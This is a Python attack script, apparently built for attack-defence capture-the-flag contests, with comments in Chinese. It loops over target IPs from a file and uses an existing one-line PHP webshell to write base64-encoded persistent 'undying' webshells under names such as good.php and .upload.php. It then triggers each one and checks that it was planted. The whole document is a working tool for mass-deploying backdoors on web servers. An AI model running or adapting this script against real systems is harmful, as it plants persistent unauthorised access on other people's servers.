import requests
import base64
from requests.exceptions import Timeout

# 常量设置
DI_ZHI = ''      # 上传的地址，也就是一句话木马的地址。
SHELL_PATH = '/config.php'  # 已存在的一句话木马名字
PASSWORD = 's'  # 一句话木马密码

# 不死马文件列表及其生成的文件名
malware_list = [
    ('bsm1.php', 'upload1.php'),
    ('bsm2.php', 'upload2.php'),
    ('bsm3.php', 'good.php'),
    ('bsm4.php', 'hhh.php'),
    ('bsm5.php', 'index1.php'),
    ('bsm6.php', '1ndex.php'),
    ('bsm7.php', 'hack.php'),
    ('bsm8.php', 'flag.php'),
    ('bsm9.php', 'hhhwiw.php'),
    ('bsm10.php', 'ffooof.php'),
    ('bsm.php', '.upload.php'),
]

# 读取目标 IP 列表
with open('ip.txt', 'r', encoding='utf-8') as f:
    for ip in f:
        ip = ip.strip()
        url = f'http://{ip}{DI_ZHI}{SHELL_PATH}'  # 一句话木马地址

        print(f'\n[*] 目标: {url}')

        # 遍历每组不死马文件
        for local_file, remote_file in malware_list:
            try:
                with open(local_file, 'r', encoding='utf-8') as f2:
                    full_content = f2.read()

                # base64 编码 PHP 内容，并处理 =
                b64_content = base64.b64encode(full_content.encode()).decode()
                b64_content = b64_content.replace('=', '%3D')

                # 构造远程写入命令：直接写成目标名如 bsm.php
                php_cmd = f"file_put_contents('bsm.php', base64_decode('{b64_content}'));"
                cmd = {
                    PASSWORD: php_cmd
                }

                print(f'  [+] 写入 {remote_file} 中...')
                # GET或者POST

                # post = requests.post(url=url, data=cmd, timeout=3)
                post = requests.get(url=url, params=cmd, timeout=3)

                # 访问触发不死马（如你原来的 bsm.php -> 触发写入）
                makekurl = f'http://{ip}{DI_ZHI}/bsm.php'
                try:
                    requests.get(url=makekurl, timeout=2)
                    print("    [×] 无响应，可能成功（生成结束）")
                except Timeout:
                    print("    [√] 超时 - 推测写入结束")

                # 最终检测上传文件是否存在
                checkurl = f'http://{ip}{DI_ZHI}/{remote_file}'
                check = requests.get(url=checkurl, timeout=2)
                if check.status_code == 200:
                    print(f"    [√] 写入成功: {checkurl}")
                else:
                    print(f"    [×] 写入失败: {checkurl}")

            except Exception as e:
                print(f"    [!] 错误: {e}")
